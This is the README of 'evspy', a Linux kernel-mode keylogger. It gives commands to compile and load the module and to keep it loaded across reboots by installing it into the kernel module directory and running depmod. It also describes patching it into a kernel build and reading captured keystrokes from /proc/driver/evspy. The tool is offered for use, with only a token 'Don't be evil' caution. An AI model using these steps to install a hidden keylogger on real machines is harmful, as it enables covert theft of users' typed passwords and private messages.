Evspy is a general purpose kernel-mode keylogger in (early) development stage.

The file from where you can read the registered keystrokes is /proc/driver/evspy
by default. Only root can read it. Beware users: evspy can troll you.

Don't be evil.


** COMPILE **
	$ make


** LOAD **
	# insmod evspy.ko


** UNLOAD **
	# rmmod evspy


** IS IT ALREADY LOADED? **
	$ lsmod | grep evspy


** PERSISTENCE **

If you want evspy to be loaded every time system boots, copy it into your
kernel module dir:
	# cp evspy.ko /lib/modules/$(uname -r)/kernel/drivers/input/evspy.ko

and update module database:
	# depmod -a

(In some distros it could also be necessary to add it to some rc/config file)

Once it has been installed, you can load it when you want with
	# modprobe evspy


** OTHER **

A patch is supplied (evspy.patch) to be able to compile a kernel with evspy
included. If KERN is the directory where your kernel is located, just copy the
patch there (KERN/) and copy all the evspy files (*.c, *.h, maps, khm) to
KERN/drivers/input/. Then, cd to KERN and apply the patch:
	$ patch -p1 < evspy.patch

Then you should be able to configure the kernel to include evspy just like
any other module:
	$ make menuconfig
		Device Drivers --> Input device support --> Event based keylogger
	$ ...
